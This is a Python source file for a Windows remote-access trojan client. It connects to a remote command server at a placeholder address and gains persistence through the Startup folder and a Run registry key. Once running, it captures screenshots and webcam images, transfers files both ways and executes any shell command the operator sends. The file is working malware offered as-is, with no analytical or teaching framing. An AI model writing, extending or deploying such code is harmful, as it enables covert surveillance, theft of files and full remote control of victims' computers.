import socket
import subprocess
import time
import platform
import psutil
import pyautogui
import cv2
import io
import struct
import os
import sys
import shutil
import winreg
import re

SERVER_IP = 'IP_ADDRESS'
SERVER_PORT = 2242
RETRY_DELAY = 60
UPLOAD_DIR = r'C:\Users\Public\Documents\Microsoft\Upload'

# תיקון PATH במקרה שחסר
ESSENTIAL_PATHS = [
    r"C:\Windows\System32",
    r"C:\Windows",
    r"C:\Windows\System32\Wbem",
    r"C:\Windows\System32\WindowsPowerShell\v1.0"
]

current_path = os.environ.get("PATH", "")
for p in ESSENTIAL_PATHS:
    if p not in current_path:
        current_path += ";" + p
os.environ["PATH"] = current_path

def clean_string(s):
    return re.sub(r'[\x00]', '', s).strip()

def send_data(sock, data):
    try:
        data_length = struct.pack('>I', len(data))
        sock.sendall(data_length + data)
    except:
        pass

def recv_data(sock):
    try:
        raw_size = sock.recv(4)
        if not raw_size:
            return None
        data_size = struct.unpack('>I', raw_size)[0]
        data = b''
        while len(data) < data_size:
            part = sock.recv(4096)
            if not part:
                break
            data += part
        return data
    except:
        return None

def add_to_startup():
    try:
        exe_path = clean_string(sys.executable)
        startup_folder = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
        destination = os.path.join(startup_folder, os.path.basename(exe_path))
        shutil.copy2(exe_path, destination)

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MyAgent", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)

        return f"[+] Persistence added (Startup + Registry)"
    except Exception as e:
        return f"[!] Persistence failed: {str(e)}"

def screenshot(sock):
    try:
        img = pyautogui.screenshot()
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        send_data(sock, buffer.getvalue())
    except Exception as e:
        send_data(sock, f"[!] Screenshot failed: {str(e)}".encode())

def webcam_capture(sock):
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            raise Exception("No webcam found.")
        _, buffer = cv2.imencode('.png', frame)
        send_data(sock, buffer.tobytes())
    except Exception as e:
        send_data(sock, f"[!] Webcam failed: {str(e)}".encode())

def upload_file(sock):
    try:
        filename = clean_string(recv_data(sock).decode())
        data = recv_data(sock)
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        filepath = os.path.join(UPLOAD_DIR, filename)
        with open(filepath, 'wb') as f:
            f.write(data)
        send_data(sock, f"[+] File uploaded to {filepath}".encode())
    except Exception as e:
        send_data(sock, f"[!] Upload failed: {str(e)}".encode())

def download_file(sock):
    try:
        filepath = clean_string(recv_data(sock).decode())
        if not os.path.exists(filepath):
            send_data(sock, b"[!] File not found.")
            return
        with open(filepath, 'rb') as f:
            send_data(sock, f.read())
    except Exception as e:
        send_data(sock, f"[!] Download failed: {str(e)}".encode())
        
def clean_string(s):
    return re.sub(r'[^\x20-\x7E]+', '', s).strip()

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
        return clean_string(output) if output else "[+] Command executed with no output."
    except subprocess.TimeoutExpired:
        return "[!] Command timed out."
    except Exception as e:
        return f"[!] Error executing command: {str(e)}"
    
def handle_command(sock, command):
    try:
        command = clean_string(command)
        if command == "__sysinfo__":
            info = f"{platform.node()} | {platform.system()} {platform.release()} | CPU: {platform.processor()} | RAM: {round(psutil.virtual_memory().total / (1024**3), 2)}GB"
            send_data(sock, info.encode())
        elif command == "__screenshot__":
            screenshot(sock)
        elif command == "__webcam__":
            webcam_capture(sock)
        elif command == "__persist__":
            result = add_to_startup()
            send_data(sock, result.encode())
        elif command == "__upload__":
            upload_file(sock)
        elif command == "__download__":
            download_file(sock)
        else:
            command = clean_string(command)
            output = execute_shell_command(command)
            send_data(sock, output.encode())
    except Exception as e:
        send_data(sock, f"[!] Error: {str(e)}".encode())

def handle_connection(sock):
    try:
        sock.sendall(clean_string(platform.node()).encode())
        while True:
            try:
                command = sock.recv(1024).decode()
                if not command or command.lower() in ('exit', 'quit'):
                    break
                handle_command(sock, command)
            except Exception as e:
                send_data(sock, f"[!] Error: {str(e)}".encode())
    except:
        pass

def connect():
    while True:
        try:
            with socket.socket() as sock:
                sock.connect((SERVER_IP, SERVER_PORT))
                handle_connection(sock)
        except:
            time.sleep(RETRY_DELAY)

if __name__ == '__main__':
    connect()
